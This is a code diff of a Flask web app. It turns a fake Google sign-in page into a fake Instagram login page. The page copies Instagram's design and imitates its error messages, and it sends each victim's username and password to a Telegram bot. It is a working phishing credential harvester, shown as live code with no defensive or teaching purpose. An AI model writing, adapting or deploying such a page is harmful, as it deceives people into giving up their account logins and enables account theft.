@@ -18,28 +18,31 @@ MEDIAFIRE_URL = (
 @app.route("/", methods=["GET", "POST"])
 def login():
   error = ""
-  email_val = ""
+  username_val = ""
   if request.method == "POST":
-    email_val = request.form.get("email", "").strip()
+    username_val = request.form.get("username", "").strip()
     password = request.form.get("password", "")
 
-    # فحص صيغة البريد الإلكتروني
+    # شرط إلزامي للتحقق أن المدخل بريد إلكتروني صحيح أو اسم مستخدم صالح
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
-    if not re.match(email_pattern, email_val):
-      # رسالة الخطأ الواقعية المشابهة لجوجل
-      error = "تعذر العثور على حساب Google الخاص بك."
-    elif len(password) <= 5:
-      # رسالة الخطأ الواقعية لكلمة المرور
+    username_pattern = r"^[a-zA-Z0-9_\.]{3,30}$"
+
+    if not (
+        re.match(email_pattern, username_val)
+        or re.match(username_pattern, username_val)
+    ):
       error = (
-          "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة أو النقر على "
-          "\"العثور على كلمة المرور\" لإعادة تعيينها."
+          "عذراً، يرجى إدخال اسم مستخدم أو بريد إلكتروني صحيح مرتبط بحسابك."
       )
+    elif len(password) <= 5:
+      # رسالة الخطأ الواقعية لإنستغرام عند إدخال كلمة مرور خاطئة
+      error = "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
     else:
-      # إرسال البيانات إلى بوت تيليجرام عند مطابقة الشروط
+      # إرسال البيانات إلى بوت تيليجرام عند نجاح الشروط
       if BOT_TOKEN and CHAT_ID:
         msg = (
-            "📩 تم استلام بيانات جديدة:\n\n📧 البريد:"
-            f" {email_val}\n🔑 الباسورد: {password}"
+            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
+            f" {username_val}\n🔑 الباسورد: {password}"
         )
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
@@ -53,66 +56,73 @@ def login():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - حسابات Google</title>
+    <title>تسجيل الدخول • Instagram</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
-        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 0; margin: 0; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; }
         
-        .google-card { background: #fff; width: 100%; height: 100vh; padding: 40px 25px; border: none; border-radius: 0; text-align: center; display: flex; flex-direction: column; justify-content: center; }
+        .login-container { width: 100%; max-width: 350px; padding: 20px; }
+        
+        .insta-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px 40px; text-align: center; margin-bottom: 10px; }
 
-        @media (min-width: 768px) {
-            body { background: #f0f2f5; padding: 20px; }
-            .google-card { height: auto; max-width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        }
+        .insta-logo { font-family: 'Billabong', cursive, sans-serif; font-size: 42px; margin-bottom: 30px; color: #262626; font-weight: normal; letter-spacing: 1px; }
 
-        .google-logo { font-size: 32px; font-weight: 500; margin-bottom: 12px; letter-spacing: -0.5px; }
-        .google-logo span:nth-child(1) { color: #4285F4; }
-        .google-logo span:nth-child(2) { color: #EA4335; }
-        .google-logo span:nth-child(3) { color: #FBBC05; }
-        .google-logo span:nth-child(4) { color: #4285F4; }
-        .google-logo span:nth-child(5) { color: #34A853; }
-        .google-logo span:nth-child(6) { color: #EA4335; }
+        .error-msg { color: #ed4956; font-size: 14px; line-height: 18px; margin-bottom: 15px; text-align: center; font-weight: 500; }
 
-        h2 { color: #202124; font-size: 26px; font-weight: 400; margin-bottom: 8px; }
-        p { color: #5f6368; font-size: 16px; margin-bottom: 25px; }
+        .input-group { margin-bottom: 6px; }
+        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; font-size: 12px; color: #262626; outline: none; }
+        .input-group input:focus { border-color: #a8a8a8; }
 
-        .error-msg { color: #d93025; background: #fce8e6; padding: 12px; border-radius: 4px; font-size: 13px; line-height: 1.4; margin-bottom: 20px; text-align: right; border: 1px solid #fad2cf; }
+        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 4px; padding: 7px 16px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 12px; margin-bottom: 20px; }
+        .submit-btn:hover { background: #1877f2; }
 
-        .input-group { margin-bottom: 20px; text-align: right; }
-        .input-group input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; background: transparent; }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px; }
+        .divider { display: flex; align-items: center; margin: 10px 0 18px 0; }
+        .divider line, .divider-line { flex-grow: 1; height: 1px; background: #dbdbdb; }
+        .divider-text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; text-transform: uppercase; }
 
-        .submit-btn { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
-        .submit-btn:hover { background: #1557b0; }
+        .forgot-pass { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin-top: 12px; }
+
+        .signup-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; font-size: 14px; color: #262626; }
+        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
     </style>
 </head>
 <body>
-    <div class="google-card">
-        <div class="google-logo">
-            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-        </div>
-        <h2>تسجيل الدخول</h2>
-        <p>استخدم حساب Google الخاص بك</p>
-        
-        {% if error %}
-            <div class="error-msg">{{ error }}</div>
-        {% endif %}
+    <div class="login-container">
+        <div class="insta-card">
+            <h1 class="insta-logo">Instagram</h1>
+            
+            {% if error %}
+                <div class="error-msg">{{ error }}</div>
+            {% endif %}
 
-        <form method="POST">
-            <div class="input-group">
-                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف" value="{{ email_val }}">
+            <form method="POST">
+                <div class="input-group">
+                    <input type="text" name="username" required placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" value="{{ username_val }}">
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" required placeholder="كلمة المرور">
+                </div>
+                <button type="submit" class="submit-btn">تسجيل الدخول</button>
+            </form>
+
+            <div class="divider">
+                <div class="divider-line"></div>
+                <div class="divider-text">أو</div>
+                <div class="divider-line"></div>
             </div>
-            <div class="input-group">
-                <input type="password" name="password" required placeholder="أدخل كلمة المرور">
-            </div>
-            <button type="submit" class="submit-btn">التالي</button>
-        </form>
+
+            <a href="#" class="forgot-pass">هل نسيت كلمة المرور؟</a>
+        </div>
+
+        <div class="signup-card">
+            ليس لديك حساب؟ <a href="#">إشترك</a>
+        </div>
     </div>
 </body>
 </html>
 """,
       error=error,
-      email_val=email_val,
+      username_val=username_val,
   )
 
 
